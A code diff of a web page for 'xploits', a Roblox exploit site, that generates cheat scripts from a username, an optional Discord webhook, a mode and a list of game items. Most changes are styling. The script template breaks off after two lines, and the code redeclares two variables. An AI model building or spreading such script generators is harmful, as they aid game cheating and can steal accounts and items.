@@ -24,29 +24,21 @@ body{background:var(--bg);color:#fff;font-family:var(--font-body);min-height:100
 .grid-bg{position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(230,57,70,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(230,57,70,0.04) 1px,transparent 1px);background-size:60px 60px;mask-image:radial-gradient(ellipse 80% 60% at 50% 50%,black 40%,transparent 100%);-webkit-mask-image:radial-gradient(ellipse 80% 60% at 50% 50%,black 40%,transparent 100%)}
 .bg-orb{position:fixed;border-radius:50%;pointer-events:none;z-index:0}
 
-nav{display:flex;align-items:center;justify-content:space-between;padding:0 2rem;height:56px;border-bottom:1px solid #1a1a1a;position:relative;z-index:10}
+nav{display:flex;align-items:center;justify-content:space-between;padding:0 1.25rem;height:56px;border-bottom:1px solid #1a1a1a;position:relative;z-index:10}
 .logo{display:flex;align-items:center;gap:8px;font-family:var(--font-display);font-weight:900;font-size:15px;text-decoration:none;color:#fff;letter-spacing:-.02em}
 .logo-icon{background:var(--red);border-radius:5px;width:26px;height:26px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
-.logo-icon img{width:16px;height:16px;object-fit:contain}
-.nav-links{display:flex;gap:1.5rem}
-.nav-links a{color:#555;font-size:13px;text-decoration:none;transition:color .2s}
-.nav-links a:hover{color:#fff}
+.logo-icon img{width:100%;height:100%;object-fit:cover}
 .nav-btns{display:flex;gap:8px}
-.nav-btn{background:transparent;border:1px solid #2a2a2a;color:#fff;padding:6px 14px;border-radius:6px;font-size:13px;text-decoration:none;display:inline-flex;align-items:center;transition:border-color .2s}
-.nav-btn:hover{border-color:#444}
-.nav-btn-red{background:var(--red);border:none;color:#fff;padding:6px 14px;border-radius:6px;font-size:13px;text-decoration:none;display:inline-flex;align-items:center}
+.nav-btn-red{background:var(--red);border:none;color:#fff;padding:6px 14px;border-radius:6px;font-size:13px;text-decoration:none;display:inline-flex;align-items:center;font-family:var(--font-body);font-weight:600}
 
-main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:2.5rem 1.5rem;position:relative;z-index:1}
+main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:2rem 1rem;position:relative;z-index:1}
 .container{width:100%;max-width:560px;display:flex;flex-direction:column;gap:16px}
-
-.badge{display:inline-flex;align-items:center;gap:8px;background:rgba(230,57,70,0.08);border:1px solid rgba(230,57,70,0.2);border-radius:100px;padding:5px 14px;font-size:.72rem;color:#ff8b8b;font-family:var(--font-mono);letter-spacing:.05em;align-self:center}
-.dot{width:7px;height:7px;border-radius:50%;background:#4ade80;box-shadow:0 0 6px #4ade80;animation:pulse 2s infinite}
 
 .card{background:var(--bg-card);border:1px solid var(--muted2);border-radius:14px;overflow:hidden;position:relative}
 .card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(230,57,70,0.3),transparent)}
-.card-header{padding:1.25rem 1.5rem;border-bottom:1px solid #1a1a1a;display:flex;align-items:center;justify-content:space-between}
+.card-header{padding:1rem 1.25rem;border-bottom:1px solid #1a1a1a;display:flex;align-items:center;justify-content:space-between}
 .card-header h2{font-family:var(--font-display);font-size:13px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;color:#888}
-.card-body{padding:1.25rem 1.5rem;display:flex;flex-direction:column;gap:14px}
+.card-body{padding:1.25rem;display:flex;flex-direction:column;gap:14px}
 
 .label{font-size:10px;font-weight:700;color:#555;letter-spacing:.6px;text-transform:uppercase;font-family:var(--font-mono);display:block;margin-bottom:6px}
 
@@ -59,24 +51,20 @@ main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:2
 .mode-btn:hover{border-color:#333;color:#888}
 .mode-btn.active{background:rgba(230,57,70,.1);border-color:var(--red);color:#fff}
 
-.brainrot-search{margin-bottom:10px}
-.brainrot-grid{display:flex;flex-wrap:wrap;gap:6px;max-height:160px;overflow-y:auto;padding-right:4px}
+.brainrot-grid{display:flex;flex-wrap:wrap;gap:6px;max-height:180px;overflow-y:auto;padding-right:4px}
 .brainrot-grid::-webkit-scrollbar{width:3px}
 .brainrot-grid::-webkit-scrollbar-thumb{background:var(--red);border-radius:10px}
 .pill{background:#0d0d0d;border:1px solid #1e1e1e;border-radius:6px;padding:5px 10px;font-size:10px;font-weight:600;color:#444;cursor:pointer;transition:all .2s;font-family:var(--font-mono);user-select:none}
 .pill:hover{border-color:#333;color:#777}
 .pill.active{background:rgba(230,57,70,.1);border-color:var(--red);color:#fff}
-.brainrot-actions{display:flex;gap:12px;margin-bottom:8px}
 .brainrot-actions button{font-size:10px;font-weight:700;color:var(--red);background:none;border:none;cursor:pointer;font-family:var(--font-mono);letter-spacing:.3px;text-transform:uppercase}
 .brainrot-actions button:hover{color:#ff6b78}
-.count-text{font-size:10px;color:#333;font-family:var(--font-mono);margin-top:6px;text-transform:uppercase;letter-spacing:.5px}
+.count-text{font-size:10px;color:#333;font-family:var(--font-mono);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
 
 .gen-btn{background:var(--red);color:#fff;border:none;padding:14px;border-radius:9px;font-size:13px;font-weight:700;cursor:pointer;width:100%;font-family:var(--font-body);letter-spacing:.5px;text-transform:uppercase;transition:opacity .2s,box-shadow .2s;box-shadow:0 0 24px rgba(230,57,70,.2)}
 .gen-btn:hover{opacity:.88;box-shadow:0 0 36px rgba(230,57,70,.35)}
-.gen-btn:disabled{opacity:.3;cursor:not-allowed;box-shadow:none}
-  
+
 .output-card{display:none}
-.output-header{display:flex;align-items:center;justify-content:space-between}
 .copy-btn{background:#1a1a1a;border:1px solid #2a2a2a;color:#fff;padding:6px 12px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;font-family:var(--font-mono);transition:background .2s}
 .copy-btn:hover{background:#222}
 .script-box{background:#0d0d0d;border:1px solid #1e1e1e;border-radius:8px;padding:1rem;font-family:var(--font-mono);font-size:12px;color:#e63946;overflow-x:auto;white-space:pre-wrap;word-break:break-all;line-height:1.7;margin-top:10px;max-height:260px;overflow-y:auto}
@@ -88,6 +76,19 @@ footer{text-align:center;padding:1.5rem;color:#222;font-size:12px;border-top:1px
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 @keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
 .container{animation:fadeUp .4s ease both}
+
+/* Mobile */
+@media(max-width:480px){
+  nav{padding:0 1rem}
+  main{padding:1.25rem .75rem}
+  .modes{grid-template-columns:repeat(2,1fr)}
+  .card-body{padding:1rem}
+  .card-header{padding:.875rem 1rem}
+  .brainrot-grid{max-height:220px}
+  .pill{font-size:9px;padding:4px 8px}
+  .inp{font-size:12px}
+  .gen-btn{padding:12px;font-size:12px}
+}
 </style>
 </head>
 <body>
@@ -101,14 +102,7 @@ footer{text-align:center;padding:1.5rem;color:#222;font-size:12px;border-top:1px
     <div class="logo-icon"><img src="/X.png" alt="X"/></div>
     xploits
   </a>
-  <div class="nav-links">
-    <a href="https://xploits.xyz">Home</a>
-    <a href="https://xploits.xyz/executors">Executors</a>
-    <a href="https://xploits.xyz/externals">Externals</a>
-    <a href="https://xploits.xyz/tools">Tools</a>
-  </div>
   <div class="nav-btns">
-    <a href="https://xploits.xyz/download" class="nav-btn">⬇ Download</a>
     <a href="https://discord.gg/4hseHSkCEE" target="_blank" class="nav-btn-red">Discord</a>
   </div>
 </nav>
@@ -121,10 +115,10 @@ footer{text-align:center;padding:1.5rem;color:#222;font-size:12px;border-top:1px
       <div class="card-body">
         <div>
           <label class="label">Roblox Username</label>
-          <input class="inp" id="roblox-username" type="text" placeholder="Target username"/>
+          <input class="inp" id="roblox-username" type="text" placeholder="Your Roblox username"/>
         </div>
         <div>
-          <label class="label">Discord Webhook</label>
+          <label class="label">Discord Webhook (Optional)</label>
           <input class="inp" id="webhook" type="text" placeholder="https://discord.com/api/webhooks/..."/>
         </div>
       </div>
@@ -134,10 +128,10 @@ footer{text-align:center;padding:1.5rem;color:#222;font-size:12px;border-top:1px
       <div class="card-header"><h2>Execution Mode</h2></div>
       <div class="card-body">
         <div class="modes">
-          <button class="mode-btn active" id="btn-normal" onclick="setMode('normal')">Normal</button>
-          <button class="mode-btn" id="btn-freeze" onclick="setMode('freeze')">Freeze</button>
-          <button class="mode-btn" id="btn-duels" onclick="setMode('duels')">Duels</button>
-          <button class="mode-btn" id="btn-insta" onclick="setMode('insta')">Insta</button>
+          <button class="mode-btn active" id="btn-normal">Normal</button>
+          <button class="mode-btn" id="btn-freeze">Freeze</button>
+          <button class="mode-btn" id="btn-duels">Duels</button>
+          <button class="mode-btn" id="btn-insta">Insta</button>
         </div>
       </div>
     </div>
@@ -146,23 +140,24 @@ footer{text-align:center;padding:1.5rem;color:#222;font-size:12px;border-top:1px
       <div class="card-header">
         <h2>Target Brainrots</h2>
         <div class="brainrot-actions">
-          <button onclick="selectAll()">All</button>
-          <button onclick="deselectAll()">None</button>
+          <button class="select-all-btn">All</button>
+          &nbsp;
+          <button class="deselect-all-btn">None</button>
         </div>
       </div>
       <div class="card-body">
-        <input class="inp brainrot-search" id="brainrot-search" placeholder="Search brainrots..."/>
+        <input class="inp" id="brainrot-search" placeholder="Search brainrots..."/>
         <div class="brainrot-grid" id="brainrot-container"></div>
         <div class="count-text" id="count-text">0 selected</div>
       </div>
     </div>
 
-    <button class="gen-btn" id="gen-btn" onclick="generateScript()">Generate Script</button>
+    <button class="gen-btn generate-btn">Generate Script</button>
 
     <div class="card output-card" id="output-card">
       <div class="card-header">
         <h2>Your Script</h2>
-        <button class="copy-btn" onclick="copyScript()">Copy</button>
+        <button class="copy-btn">Copy</button>
       </div>
       <div class="card-body">
         <pre class="script-box" id="script-display"></pre>
@@ -175,24 +170,16 @@ footer{text-align:center;padding:1.5rem;color:#222;font-size:12px;border-top:1px
 <footer>xploits.xyz — Roblox exploit tracker</footer>
 
 <script>
-const LOADERS = {
-  normal: "c5a067c93477b930cc4602547c6d5ffe",
-  freeze: "ecd65ca2d9a4cf35c9951aada0f53aa2",
-  duels:  "82744afa27eb7289197ee5032a94ca10",
-  insta:  "69ebd47abc10f91ef0a43a3f26746221",
-}
+const LOADERS = { normal: "normal_loader", freeze: "freeze_loader", duels: "duels_loader", insta: "insta_loader" }
 
 const brainrots = ["Garama and Madundung","Capitano Moby","Burguro And Fryuro","Ketchuru and Musturu","Lavadorito Spinito","Ketupat Kepat","Tictac Sahur","Tang Tang Keletang","Money Money Puggy","Nuclearo Dinossauro","Graipuss Medussi","Cerberus","Dragon Cannelloni","Agarrini la Palini","Fragola La La La","Los Hotspotsitos","Los Bros","Tralaledon","Los Puggies","Los Primos","Los Tacoritas","Los Spaghettis","Spooky and Pumpky","Fragrama and Chocrama","La Casa Boo","Ketupat Bros","Cooki and Milki","Popcuru and Fizzuru","La Supreme Combinasion","Dragon Gingerini","Headless Horseman","Hydra Dragon Cannelloni","Celularcini Viciosini","La Grande Combinasion","Los Trios","La Sahur Combinasion","Bacuru and Egguru","Eviledon","Orcaledon","Money Money Reindeer","Los Jolly Combinasionas","Jolly Jolly Sahur","Chicleteira Noelteira","Bisonte Giuppitere","Jackorilla","Reindeer Tralala","Pumpkini Spyderini","Frankentteo","Santteo","Telemorte","Spaghetti Tualetti","La Secret Combinasion","La Food Combinasion","Los Spooky Combinasionas","Karkerkar Kurkur","La Ginger Sekolah","Rosey and Teddy","Los Sekolahs","Reinito Sleighito","Swaggy Bros","La Taco Combinasion","Chipso and Queso","La Spooky Grande","Tuff Toucan","Chillin Chili","Gobblino Uniciclino","Strawberry Elephant","La Extinct Grande","Tacorita Bicicleta","Quesadillo Vampiro","Perrito Burrito","La Vacca Saturno Saturnita","Karker Sahur","Bunito Bunito Spinito","Pirulitoita Bicicleteira","Bunnyman","Brunito Marsito","Guest 666","Mariachi Corazoni","Swag Soda","Extinct Matteo","Los Quesadillas","Spinny Hammy","Meowl","Skibidi Toilet","Nacho Spyder","Griffin","W or L","La Jolly Grande","La Romantic Grande","Festive 67","Los Tralaleritos","Las Tralaleritas","GOAT","Love Love Bear","Ginger Gerat","Mieteteira Bicicleteira","Trenostruzzo Turbo 4000","La Karkerkar Combinasion","La Vacca Prese Presente","Rocco Disco","Cuadramat and Pakrahmatmamat","25","Cupid Cupid Sahur","Ho Ho Ho Sahur","Chill Puppy","Los Sweethearts","Las Sis","Los Planitos","Los Candies","Los Mobilis","Zombie Tralala","Boatito Auratito","Vulturino Skeletono","La Cucaracha","Extinct Tralalero","La Vacca Jacko Linterino","Triplito Tralaleritos","Trickolino","Giftini Spyderini","Love Love Love Sahur","Please my Present","Santa Hotspot","Naughty Naughty","Cupid Hotspot","Noo my Candy","Noo my Present","Ventoliero Pavonero","Los Cupids","Celestial Pegasus","Antonio","La Lucky Grande","Granny","Cloverat Clapat","Dug dug dug","Fortunu and Cashuru","Gold Gold Gold","Snailo Clovero","Noo my Gold","Luck Luck Luck Sahur","La Vacca Lepre Lepreino","Clovkur Kurkur","Patteo","Foxini Lanternini","Eid Eid Eid Sahur","To to to Sahur","Chicleteirina Bicicleteirina","Chicliterita bicicliterita","Chicleteira Bicicleteira","Job Job Job Sahur","Lovin Rose","List List List Sahur","Los Combinasionas","Los Amigos","Sammyni Fattini","Rosetti Tualetti","Los 67","Esok Sekolah","Pot Hotspot","Guerriro Digitale","Los Tortus","Torrtuginni Dragonfrutini","Los Mi Gatitos","Los Chicleteiras","Yess my examine","Noo my examine","1x1x1x1","Los Karkeritos","Las Vaquitas Saturnitas","Los Spyderinis","Los Matteos","Los Cucarachas","67","Los Burritos","Rang Ring Bus","Arcadopus","Los Nooo My Hotspotsitos","Burrito Bandito","Mi Gatito","Pot Pumpkin","Quesadilla Crocodila","Horegini Boom","Nooo My Hotspot","Tung Tung Tung Sahur","Los Jobcitos","Coffin Tung Tung Tung Sahur","Blackhole Goat","Chachechi","Dul Dul Dul","Sammyni Spyderini","Chicleteira Cupideira","Fishino Clownino","Chimnino","Noo my Heart","Los 25","Donkeyturbo Express","Elefanto Frigo","Noo my Eggs","Tirilikalika Tirilikalako","Signore Carapace","Bunny and Eggy","Boppin Bunny","Hopilikalika Hopilikalako","Hydra Bunny","Cash or Card","Arcadragon","Rico Dinero","Pancake and Syrup","Quackini Snackini","Pretzel-Bot 3000","Los Kalikakiikas","Digi Narwhal","Gym Bros","Camero Ricero Mechero","Los Chillis","Money Money Bros","Duggy Bros","Los Hackers","John Pork"]
-
-let selected = new Set()
-let currentMode = "normal"
 
 const selected = new Set()
 let currentMode = "normal"
 
 const c = document.getElementById("brainrot-container")
 let currentFiltered = brainrots
-c.innerHTML = ""
+
 brainrots.forEach(name => {
   const p = document.createElement("div")
   p.className = "pill"
@@ -245,6 +232,7 @@ document.querySelector(".deselect-all-btn").addEventListener("click", () => {
 document.querySelector(".generate-btn").addEventListener("click", () => {
   const user = document.getElementById("roblox-username").value.trim() || "USER"
   const webhook = document.getElementById("webhook").value.trim() || "WEBHOOK"
+  const loader = LOADERS[currentMode]
   const bTable = Array.from(selected).map(b => `    ["${b}"] = true`).join(",\n")
   const script = `getgenv().TARGET_USER = "${user}"
 getgenv().WEBHOOK_URL = "${webhook}"
